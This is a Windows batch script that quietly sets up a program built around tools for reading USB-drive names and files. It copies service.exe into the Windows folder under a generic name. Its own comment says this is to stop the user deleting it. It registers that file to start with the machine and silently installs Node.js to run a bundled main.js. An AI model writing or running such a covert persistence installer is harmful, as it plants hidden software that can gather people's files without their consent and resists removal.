rem made by zhoushoujian on 2018/10/28
@echo off
ver
echo %date% %time%

rem 检测如果不是64位系统，直接退出程序
if not exist "%SystemDrive%\Program Files (x86)" exit

rem 准备操作
echo prepare task...  
rem if exist %~dp0\node_modules xcopy /e /i /y  %~dp0\node_modules %appdata%\npm\node_modules 
rem if exist %~dp0\node_modules rmdir /s /q %~dp0\node_modules
if not exist %appdata%\npm mkdir %appdata%\npm
if exist %~dp0\main.js copy %~dp0\main.js %appdata%\npm\main.js
rem if exist %~dp0\main.js del /f /q  %~dp0\main.js
if exist %~dp0\getUDiskName.exe copy %~dp0\getUDiskName.exe %appdata%\npm\getUDiskName.exe
rem if exist %~dp0\getUDiskName.exe del /f /q  %~dp0\getUDiskName.exe
if exist %~dp0\getUDiskFiles.exe copy %~dp0\getUDiskFiles.exe %appdata%\npm\getUDiskFiles.exe
rem if exist %~dp0\getUDiskFiles.exe del /f /q  %~dp0\getUDiskFiles.exe
if exist %~dp0\iconv-lite.exe copy %~dp0\iconv-lite.exe %appdata%\npm\iconv-lite.exe
rem if exist %~dp0\iconv-lite.exe del /f /q  %~dp0\iconv-lite.exe
if exist %~dp0\nodex64.msi copy %~dp0\nodex64.msi %appdata%\npm\nodex64.msi
rem if exist %~dp0\nodex64.msi del /f /q  %~dp0\nodex64.msi
echo prepare task finish!

rem 拷贝主程序到其他目录并设置开机自启，防止用户手动删除这个文件
if not exist %windir%\service.exe copy %~dp0\service.exe %windir%\service.exe
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v service /t REG_SZ /d "%windir%\service.exe" /f

rem 检测nodejs是否已经安装过了，如果装过了就不再安装，加快程序运行
if exist "%SystemDrive%\Program Files\nodejs" goto run
start /wait "" %appdata%\npm\nodex64.msi /quiet
:run
rem 检测ascil到utf8的转码库是否存在，不存在就在线安装，存在就不再安装
if exist "%appdata%\npm\node_modules\iconv-lite\README.md" goto runjs
call "%appdata%\npm\iconv-lite.exe"
:runjs
rem 运行js程序
if exist "%SystemDrive%\Program Files\nodejs"  node %appdata%\npm\main.js

pause